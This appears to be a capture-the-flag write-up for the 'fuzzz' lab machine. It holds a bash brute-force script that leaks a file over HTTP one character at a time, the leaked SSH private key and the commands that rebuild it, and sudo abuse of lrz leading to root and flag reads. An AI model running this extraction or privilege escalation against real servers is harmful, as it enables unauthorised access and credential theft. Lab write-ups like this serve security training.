+:: Progress: [207630/207630] :: Job [1/1] :: 781 req/sec :: Duration: [0:05:15] :: Errors: 0 ::
+
+#!/bin/bash
+
+TARGET_URL="http://127.0.0.1:8080"
+LINES=("line1" "line2" "line3" "line4" "line5")
+CHARSET=" !"$%&'()*+,-/0123456789:;<=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
+
+echo "Starting full ASCII extraction..."
+
+for LINE in "${LINES[@]}"; do
+CURRENT_STRING=""
+printf "Processing %s: " "$LINE"
+
+while true; do
+    FOUND=false
+    for (( i=0; i<${#CHARSET}; i++ )); do
+        CHAR="${CHARSET:$i:1}"
+
+        case "$CHAR" in
+            " ") ENCODED="%20" ;;
+            "\"") ENCODED="%22" ;;
+            "$") ENCODED="%24" ;;
+            "%") ENCODED="%25" ;;
+            "&") ENCODED="%26" ;;
+            "+") ENCODED="%2B" ;;
+            "/") ENCODED="%2F" ;;
+            ":") ENCODED="%3A" ;;
+            ";") ENCODED="%3B" ;;
+            "<") ENCODED="%3C" ;;
+            "=") ENCODED="%3D" ;;
+            ">") ENCODED="%3E" ;;
+            "@") ENCODED="%40" ;;
+            "[") ENCODED="%5B" ;;
+            "\\") ENCODED="%5C" ;;
+            "]") ENCODED="%5D" ;;
+            "^") ENCODED="%5E" ;;
+            "\`") ENCODED="%60" ;;
+            "{") ENCODED="%7B" ;;
+            "|") ENCODED="%7C" ;;
+            "}") ENCODED="%7D" ;;
+            "~") ENCODED="%7E" ;;
+            *) ENCODED="$CHAR" ;;
+        esac
+
+        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/$LINE/$CURRENT_STRING$ENCODED")
+
+        if [ "$STATUS" == "200" ]; then
+            printf "%s" "$CHAR"
+            CURRENT_STRING="${CURRENT_STRING}${CHAR}"
+            FOUND=true
+            break
+        fi
+    done
+
+    if [ "$FOUND" = false ]; then
+        echo ""
+        echo "$CURRENT_STRING" >> output.txt
+        break
+    fi
+done
+done
+
+echo "Extraction complete. Results saved to output.txt."
+
+this is hint for our file extraction
+
+so with this run this file and you will get it.
+
+bash bf.sh
+Starting full ASCII extraction...
+Processing line1: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+Processing line2: QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
+Processing line3: XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
+Processing line4: AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
+Processing line5: 5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
+Extraction complete. Results saved to output.txt.
+
+┌──(kali㉿kali)-[~]
+└─$ echo "-----BEGIN OPENSSH PRIVATE KEY-----" > asahi_key
+
+┌──(kali㉿kali)-[~]
+└─$ tr -d '\n ' < output.txt >> asahi_key
+
+┌──(kali㉿kali)-[~]
+└─$ echo -e "\n-----END OPENSSH PRIVATE KEY-----" >> asahi_key
+
+┌──(kali㉿kali)-[~]
+└─$ chmod 600 asahi_key
+
+fuzzz:~$ ls
+user.flag
+fuzzz:~$ cat user.flag
+flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+
+and we have this.
+
+sudo /usr/local/bin/lrz --help
+lrz version 0.12.21rc
+Usage: lrz [options] [filename.if.xmodem]
+Receive files with ZMODEM/YMODEM/XMODEM protocol
+(X) = option applies to XMODEM only
+(Y) = option applies to YMODEM only
+(Z) = option applies to ZMODEM only
+-+, --append append to existing files
+-a, --ascii ASCII transfer (change CR/LF to LF)
+-b, --binary binary transfer
+-B, --bufsize N buffer N bytes (N==auto: buffer whole file)
+-c, --with-crc Use 16 bit CRC (X)
+-C, --allow-remote-commands allow execution of remote commands (Z)
+-D, --null write all received data to /dev/null
+--delay-startup N sleep N seconds before doing anything
+-e, --escape Escape control characters (Z)
+-E, --rename rename any files already existing
+--errors N generate CRC error every N bytes (debugging)
+-h, --help Help, print this usage message
+-m, --min-bps N stop transmission if BPS below N
+-M, --min-bps-time N for at least N seconds (default: 120)
+-O, --disable-timeouts disable timeout code, wait forever for data
+--o-sync open output file(s) in synchronous write mode
+-p, --protect protect existing files
+-q, --quiet quiet, no progress reports
+-r, --resume try to resume interrupted file transfer (Z)
+-R, --restricted restricted, more secure mode
+-s, --stop-at {HH|+N} stop transmission at HH or in N seconds
+-S, --timesync request remote time (twice: set local time)
+--syslog[=off] turn syslog on or off, if possible
+-t, --timeout N set timeout to N tenths of a second
+--tcp-server open socket, wait for connection (Z)
+--tcp-client ADDR open socket, connect to ... (Z)
+-u, --keep-uppercase keep upper case filenames
+-U, --unrestrict disable restricted mode (if allowed to)
+-v, --verbose be verbose, provide debugging information
+-w, --windowsize N Window is N bytes (Z)
+-X --xmodem use XMODEM protocol
+-y, --overwrite Yes, clobber existing file if any
+--ymodem use YMODEM protocol
+-Z, --zmodem use ZMODEM protocol
+
+short options use the same arguments as the long ones
+
+sudo /usr/local/bin/lrz --tcp-server
+connect with lrz --tcp-client "fuzzz.hmv:46143"
+
+lrz waiting to receive.fuzzz:/etc$ sudo -l
+User asahi may run the following commands on fuzzz:
+(ALL : ALL) NOPASSWD: ALL
+fuzzz:/etc$ sudo su
+/etc # id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/etc # cat /root/root.flag
+flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
+/etc # cat /home/asahi/user.flag
+flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+
+
+Close
